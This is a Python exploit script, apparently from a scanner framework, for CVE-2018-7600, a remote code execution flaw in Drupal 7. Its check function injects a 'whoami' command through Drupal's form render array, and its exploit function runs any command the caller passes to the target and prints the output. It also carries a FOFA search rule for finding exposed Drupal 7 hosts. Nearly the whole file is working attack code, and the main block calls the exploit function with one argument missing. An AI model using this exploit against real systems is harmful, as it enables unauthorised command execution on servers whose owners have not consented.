#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import requests

from Config.config_proxies import proxies

requests.packages.urllib3.disable_warnings()

########################################################################################################################
# 脚本信息
NAME='CVE_2018_7600'
AUTHOR="RabbitMask"
REMARK='Drupal 7 RCE'
FOFA_RULE='app="Drupal-7"'
########################################################################################################################
# 漏洞检测模块
def poc(target):
    result={}
    cmd='whoami'
    get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': cmd}
    post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
    try:
        r = requests.post(target, params=get_params, data=post_params, verify=False,allow_redirects=False,proxies=proxies)
        rule1 = re.compile(r'<input type="hidden" name="form_build_id" value="(.*?)" />')
        form_build_id = rule1.findall(r.text)
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id[0]}
            post_params = {'form_build_id':form_build_id[0]}
            r = requests.post(target, params=get_params, data=post_params, verify=False,proxies=proxies)
            rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
            parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
            if parsed_result and len(parsed_result[0])>0 and len(parsed_result[0])<100:
                result['target']=target
                result['poc']=NAME
                result['whoami']=str(parsed_result[0])
                return result
    except:
        pass
########################################################################################################################
                                        #以上为模板限制区域，以下为自由发挥区域
########################################################################################################################
# 漏洞利用模块
def exp(target,cmd):
    get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#type]':'markup', 'name[#markup]': cmd}
    post_params = {'form_id':'user_pass', '_triggering_element_name':'name', '_triggering_element_value':'', 'opz':'E-mail new Password'}
    try:
        r = requests.post(target, params=get_params, data=post_params, verify=False,allow_redirects=False,proxies=proxies)
        rule1 = re.compile(r'<input type="hidden" name="form_build_id" value="(.*?)" />')
        form_build_id = rule1.findall(r.text)
        if form_build_id:
            get_params = {'q':'file/ajax/name/#value/' + form_build_id[0]}
            post_params = {'form_build_id':form_build_id[0]}
            r = requests.post(target, params=get_params, data=post_params, verify=False,proxies=proxies)
            rule2 = re.compile(r'(.*?)\[{"command":"settings","settings":.*?')
            parsed_result=rule2.findall(r.text.replace('\n','').replace(' ','').replace('\r','').replace('\t',''))
            if parsed_result and len(parsed_result[0])>0:
                print(target,'Drupal-7',parsed_result[0])
    except:
        pass



if __name__ == '__main__':
    exp('http://127.0.0.1')